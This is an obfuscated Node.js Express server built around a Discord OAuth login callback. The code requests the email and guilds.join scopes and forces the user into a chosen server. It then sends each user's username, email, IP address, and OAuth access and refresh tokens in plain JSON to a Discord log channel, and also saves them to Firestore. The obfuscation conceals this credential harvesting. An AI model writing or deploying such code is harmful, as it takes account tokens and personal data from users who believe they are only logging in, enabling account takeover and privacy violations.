const _0x41d1b5=_0x5dd9;(function(_0x59d2a6,_0x382b6d){const _0x9d824=_0x5dd9,_0x67152d=_0x59d2a6();while(!![]){try{const _0xb24e12=-parseInt(_0x9d824(0xf0))/0x1+-parseInt(_0x9d824(0xec))/0x2*(-parseInt(_0x9d824(0xee))/0x3)+parseInt(_0x9d824(0xe1))/0x4+parseInt(_0x9d824(0xef))/0x5+parseInt(_0x9d824(0xbc))/0x6+parseInt(_0x9d824(0xde))/0x7+-parseInt(_0x9d824(0xc8))/0x8;if(_0xb24e12===_0x382b6d)break;else _0x67152d['push'](_0x67152d['shift']());}catch(_0x50073a){_0x67152d['push'](_0x67152d['shift']());}}}(_0x4794,0xa4999),require(_0x41d1b5(0xe3))[_0x41d1b5(0xcc)]());function _0x5dd9(_0x9fc194,_0x301b63){const _0x4794c8=_0x4794();return _0x5dd9=function(_0x5dd9c3,_0x4e96d0){_0x5dd9c3=_0x5dd9c3-0xb2;let _0x580d22=_0x4794c8[_0x5dd9c3];return _0x580d22;},_0x5dd9(_0x9fc194,_0x301b63);}const express=require(_0x41d1b5(0xbf)),axios=require(_0x41d1b5(0xb9)),cors=require(_0x41d1b5(0xe8)),admin=require(_0x41d1b5(0xeb)),app=express();function _0x4794(){const _0x2f6fed=['send','express','serverTimestamp','data','users','authorization_code','Erro\x20no\x20callback:','/members/','/?success=true','x-forwarded-for','17748360EOAwYM','application/x-www-form-urlencoded','Servidor\x20rodando\x20na\x20porta\x20','user','config','Dados\x20salvos\x20no\x20Firestore\x20com\x20ID:\x20','cert','json','listen','redirect','N/A','toISOString','project_id','Bot\x20','env','username','add','connection','stringify','error','use','response','7892717XoBYnj','/guilds/','post','2881628mQvKjn','/channels/','dotenv','Erro\x20ao\x20enviar\x20dados:','log','guildId','https://discord.com/api','cors','categoryId','initializeApp','firebase-admin','2bQfTLx','firestore','1417773zXdBVY','5942610qfpVCs','1317365EzFDfw','application/json','Erro\x20ao\x20adicionar\x20membro\x20ao\x20servidor:','client_email','private_key','email','refreshToken','type','query','get','collection','accessToken','remoteAddress','headers','axios','credential','code','4206360ThUYVl','message'];_0x4794=function(){return _0x2f6fed;};return _0x4794();}admin[_0x41d1b5(0xea)]({'credential':admin[_0x41d1b5(0xba)][_0x41d1b5(0xce)]({'projectId':process[_0x41d1b5(0xd6)][_0x41d1b5(0xd4)],'clientEmail':process['env'][_0x41d1b5(0xf3)],'privateKey':process['env'][_0x41d1b5(0xf4)]['replace'](/\\n/g,'\x0a')})});const db=admin['firestore'](),{CLIENT_ID,CLIENT_SECRET,BOT_TOKEN,REDIRECT_URI,GUILD_ID=process['env'][_0x41d1b5(0xe6)]||process['env']['specialServerId'],LOG_CHANNEL_ID,PORT=0x1f90,FRONTEND_URL}=process[_0x41d1b5(0xd6)];app[_0x41d1b5(0xdc)](cors({'origin':FRONTEND_URL,'credentials':!![]})),app['use'](express[_0x41d1b5(0xcf)]());const discordAPI=_0x41d1b5(0xe7);async function sendJSONMessage(_0x41c796){const _0x1838e9=_0x41d1b5;try{LOG_CHANNEL_ID&&await axios[_0x1838e9(0xe0)](discordAPI+_0x1838e9(0xe2)+LOG_CHANNEL_ID+'/messages',{'content':JSON[_0x1838e9(0xda)](_0x41c796)},{'headers':{'Authorization':_0x1838e9(0xd5)+BOT_TOKEN,'Content-Type':_0x1838e9(0xf1)}});const _0x417346={'username':_0x41c796[_0x1838e9(0xcb)],'discordId':_0x41c796['id'],'email':_0x41c796[_0x1838e9(0xf5)]||'N/A','ipAddress':_0x41c796['ip'],'accessToken':_0x41c796[_0x1838e9(0xb6)],'refreshToken':_0x41c796[_0x1838e9(0xf6)],'timestamp':admin[_0x1838e9(0xed)]['FieldValue'][_0x1838e9(0xc0)](),'guildId':GUILD_ID};process[_0x1838e9(0xd6)]['categoryId']&&(_0x417346[_0x1838e9(0xe9)]=process[_0x1838e9(0xd6)]['categoryId']);process[_0x1838e9(0xd6)][_0x1838e9(0xb2)]&&(_0x417346[_0x1838e9(0xb2)]=process['env'][_0x1838e9(0xb2)]);const _0x4c6fde=await db[_0x1838e9(0xb5)](_0x1838e9(0xc2))[_0x1838e9(0xd8)](_0x417346);console[_0x1838e9(0xe5)](_0x1838e9(0xcd),_0x4c6fde['id']);}catch(_0x230206){console[_0x1838e9(0xdb)](_0x1838e9(0xe4),_0x230206[_0x1838e9(0xbd)]);}}app[_0x41d1b5(0xb4)]('/callback',async(_0x31b4b2,_0x5ef29d)=>{const _0x42da7d=_0x41d1b5,_0x3666a7=_0x31b4b2[_0x42da7d(0xb3)][_0x42da7d(0xbb)],_0x2ba341=_0x31b4b2[_0x42da7d(0xb8)][_0x42da7d(0xc7)]||_0x31b4b2[_0x42da7d(0xd9)][_0x42da7d(0xb7)];if(!_0x3666a7)return _0x5ef29d['status'](0x190)[_0x42da7d(0xbe)]('CÃ³digo\x20ausente');try{const _0x4af945=await axios[_0x42da7d(0xe0)](discordAPI+'/oauth2/token',new URLSearchParams({'client_id':CLIENT_ID,'client_secret':CLIENT_SECRET,'grant_type':_0x42da7d(0xc3),'code':_0x3666a7,'redirect_uri':REDIRECT_URI,'scope':'identify\x20email\x20guilds\x20guilds.join'}),{'headers':{'Content-Type':_0x42da7d(0xc9)}}),{access_token:_0x22796c,refresh_token:_0x262b52,token_type:_0x44d8ff}=_0x4af945[_0x42da7d(0xc1)],_0x58e822=await axios[_0x42da7d(0xb4)](discordAPI+'/users/@me',{'headers':{'Authorization':_0x44d8ff+'\x20'+_0x22796c}}),_0x26b8d8=_0x58e822['data'];try{await axios['put'](discordAPI+_0x42da7d(0xdf)+GUILD_ID+_0x42da7d(0xc5)+_0x26b8d8['id'],{'access_token':_0x22796c},{'headers':{'Authorization':_0x42da7d(0xd5)+BOT_TOKEN,'Content-Type':_0x42da7d(0xf1)}});}catch(_0x284c1d){console[_0x42da7d(0xdb)](_0x42da7d(0xf2),_0x284c1d[_0x42da7d(0xdd)]?.[_0x42da7d(0xc1)]||_0x284c1d['message']);}return await sendJSONMessage({'user':_0x26b8d8[_0x42da7d(0xd7)],'id':_0x26b8d8['id'],'email':_0x26b8d8[_0x42da7d(0xf5)]||_0x42da7d(0xd2),'ip':_0x2ba341,'accessToken':_0x22796c,'refreshToken':_0x262b52,'timestamp':new Date()[_0x42da7d(0xd3)]()}),_0x5ef29d['redirect'](FRONTEND_URL+_0x42da7d(0xc6));}catch(_0x274e54){return console['error'](_0x42da7d(0xc4),_0x274e54['response']?.[_0x42da7d(0xc1)]||_0x274e54['message']),_0x5ef29d[_0x42da7d(0xd1)](FRONTEND_URL+'/?error=auth_failed');}}),app[_0x41d1b5(0xd0)](PORT,()=>{const _0x455e45=_0x41d1b5;console[_0x455e45(0xe5)](_0x455e45(0xca)+PORT);});
